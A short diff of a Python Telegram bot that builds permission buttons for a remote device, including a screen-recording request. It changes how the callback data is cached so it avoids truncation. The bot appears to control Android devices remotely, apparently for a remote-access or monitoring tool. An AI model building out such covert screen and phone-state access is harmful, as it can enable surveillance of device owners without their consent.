@@ -482,9 +482,12 @@ def permissions_keyboard(did):
     kb.add(perm_btn("notifications", "🔔 الإشعارات"),
            perm_btn("phone-state", "📱 حالة الهاتف"))
     # ⚡ زر طلب إذن MediaProjection (تسجيل الشاشة)
+    # نستخدم نفس آلية cache key مثل request-permission لتجنب truncation
+    cache_key = str(len(_file_path_cache))
+    _file_path_cache[cache_key] = "request-screen-permission"
     screen_btn = InlineKeyboardButton(
         "🖥️ تسجيل الشاشة",
-        callback_data=_cb(did, "cmd", "request-screen-permission")
+        callback_data=f"cmd:{did}:p{cache_key}"[:64]
     )
     kb.add(screen_btn)
     kb.add(_back(did))
